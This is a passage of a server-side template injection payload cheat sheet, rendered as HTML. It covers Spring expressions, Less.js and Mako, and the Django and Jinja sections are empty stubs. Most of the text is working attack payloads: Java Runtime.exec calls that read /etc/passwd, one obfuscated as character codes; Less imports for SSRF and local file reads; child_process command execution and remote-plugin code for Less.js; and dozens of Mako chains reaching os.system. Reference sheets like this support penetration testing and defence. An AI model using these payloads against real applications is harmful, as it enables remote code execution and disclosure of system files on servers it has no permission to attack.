+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>cat etc<span style="color:#f92672">/</span>passwd<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>org<span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">commons</span><span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOUtils</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">99</span><span style="color:#f92672">).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">97</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">116</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">32</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">101</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">116</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">99</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">112</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">97</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">115</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">115</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">119</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">100</span><span style="color:#f92672">))).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">())}</span>
+</span></span></code></pre></div><hr>
+<h2 id="django-templates">
+  Django Templates
+  <a class="anchor" href="#django-templates">#</a>
+</h2>
+<p>Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.</p>
+<h3 id="need-bugfix-for-django">
+  NEED BUGFIX FOR DJANGO
+  <a class="anchor" href="#need-bugfix-for-django">#</a>
+</h3>
+<h2 id="jinja2">
+  Jinja2
+  <a class="anchor" href="#jinja2">#</a>
+</h2>
+<p>
+  <a href="https://jinja.palletsprojects.com/">Official website</a></p>
+<blockquote>
+<p>Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.</p>
+</blockquote>
+<h3 id="need-bugfix-for-jinja2">
+  NEED BUGFIX FOR JINJA2
+  <a class="anchor" href="#need-bugfix-for-jinja2">#</a>
+</h3>
+<hr>
+<h2 id="jinjava">
+  Jinjava
+  <a class="anchor" href="#jinjava">#</a>
+</h2>
+<p>
+  <a href="https://github.com/HubSpot/jinjava">Official website</a></p>
+<blockquote>
+<p>Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).</p>
+</blockquote>
+<h3 id="need-bugfix-for-jinjava">
+  NEED BUGFIX FOR JINJAVA
+  <a class="anchor" href="#need-bugfix-for-jinjava">#</a>
+</h3>
+<hr>
+<h2 id="lessjs">
+  Lessjs
+  <a class="anchor" href="#lessjs">#</a>
+</h2>
+<p>
+  <a href="https://lesscss.org/">Official website</a></p>
+<blockquote>
+<p>Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.</p>
+</blockquote>
+<h3 id="lessjs---ssrf--lfi">
+  Lessjs - SSRF / LFI
+  <a class="anchor" href="#lessjs---ssrf--lfi">#</a>
+</h3>
+<pre tabindex="0"><code class="language-less" data-lang="less">@import (inline) &#34;http://localhost&#34;;
+// or
+@import (inline) &#34;/etc/passwd&#34;;
+</code></pre><h3 id="lessjs--v3---command-execution">
+  Lessjs &lt; v3 - Command Execution
+  <a class="anchor" href="#lessjs--v3---command-execution">#</a>
+</h3>
+<pre tabindex="0"><code class="language-less" data-lang="less">body {
+  color: `global.process.mainModule.require(&#34;child_process&#34;).execSync(&#34;id&#34;)`;
+}
+</code></pre><h3 id="plugins">
+  Plugins
+  <a class="anchor" href="#plugins">#</a>
+</h3>
+<p>Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.</p>
+<pre tabindex="0"><code class="language-less" data-lang="less">// example local plugin usage
+@plugin &#34;plugin-2.7.js&#34;;
+</code></pre><p>or</p>
+<pre tabindex="0"><code class="language-less" data-lang="less">// example remote plugin usage
+@plugin &#34;http://example.com/plugin-2.7.js&#34;
+</code></pre><p>version 2 example RCE plugin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">functions</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">val</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">`&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#a6e22e">val</span>.<span style="color:#a6e22e">value</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;`</span>;
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>version 3 and above example RCE plugin</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">//Vulnerable plugin (3.13.1)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">registerPlugin</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">install</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">less</span>, <span style="color:#a6e22e">pluginManager</span>, <span style="color:#a6e22e">functions</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">functions</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">val</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#a6e22e">val</span>.<span style="color:#a6e22e">value</span>).<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><hr>
+<h2 id="mako">
+  Mako
+  <a class="anchor" href="#mako">#</a>
+</h2>
+<p>
+  <a href="https://www.makotemplates.org/">Official website</a></p>
+<blockquote>
+<p>Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>x<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{x}
+</span></span></code></pre></div><h3 id="direct-access-to-os-from-templatenamespace">
+  Direct access to os from TemplateNamespace:
+  <a class="anchor" href="#direct-access-to-os-from-templatenamespace">#</a>
+</h3>
+<p>Any of these payloads allows direct access to the <code>os</code> module</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;util&#39;</span>]<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;id&#39;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;id&#39;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>_with_template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>traceback<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>attr<span style="color:#f92672">.</span>_NSAttr__parent<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>cache<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>_mmarker<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>util<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>filters<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{self<span style="color:#f92672">.</span>template<span style="color:#f92672">.</span>module<span style="color:#f92672">.</span>runtime<span style="color:#f92672">.</span>compat<span style="color:#f92672">.</span>inspect<span style="color:#f92672">.</span>linecache<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)}
